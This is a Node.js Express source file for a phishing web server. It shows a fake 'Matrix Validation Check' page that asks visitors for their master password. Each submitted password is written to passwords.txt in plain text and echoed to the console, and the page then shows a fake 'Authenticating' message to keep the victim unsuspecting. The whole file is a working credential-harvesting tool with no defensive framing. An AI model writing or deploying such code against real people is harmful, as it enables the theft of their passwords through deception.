const express = require('express')
const app = express()
const port = 80
const fs = require('fs');
const BodyParser = require('body-parser')
app.use(BodyParser.urlencoded({extended: true}))

var title ='';

const generateHTML = (title) => `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Matrix Validation Check</title>
  <style>
    body{
      font-family: Arial, Helvetica, sans-serif;
      text-align: center;
      background-color:  #d5dbdb ;
      padding: 20px;
    }
    button{
		padding: 10px;
	}
	#connecting{
		visibility: hidden;
	}
  </style>
</head>
<body>
  <div id="password-form">
  	<div>${title || ''}</div>
      <img src="./matrix.jpg" alt="" width="180vw">
      
      <p>To make sure you are not in the matrix, enter your master password!</p>

	  <form method="post" action="password" id="mform">
		<p>Please enter your master password: </p>
		<input type="text" name="password" size="35%">
		<passwordp><input type="submit" name="button"  value="Validate"></p>
	  </form> 
  </div>
	
</body>
</html>`;


app.get('/', (req, res) => {
    console.log('The client entered his password...');
    res.send(generateHTML());
});

app.post('/password', (req, res) => {
    const password = req.body.password;
    fs.appendFileSync('passwords.txt', `password : ${password} \n`);
    console.log(`The client entered another password : ${password}`);
    title = "Authenticating master password..."
    res.send(generateHTML(title));
});

app.listen(port, () => {
    console.log(`WebServer is up. Listening at http://localhost:${port}`);
})
